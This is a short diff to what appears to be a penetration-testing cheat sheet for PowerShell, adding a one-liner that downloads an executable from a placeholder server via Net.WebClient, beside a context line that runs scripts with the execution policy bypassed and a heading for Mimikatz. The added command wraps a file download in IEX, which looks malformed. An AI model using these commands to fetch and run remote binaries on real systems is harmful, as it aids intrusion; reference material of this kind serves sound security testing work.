@@ -47,7 +47,10 @@ Execute ps script
 powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File <scriptname>
 ```
 
-
+Download file with System.Net.WebClient
+```
+IEX(New-Object Net.WebClient).downloadFile("http://someserver/somefile.exe", "Filename.exe")
+```
 
 ## Mimikatz
 
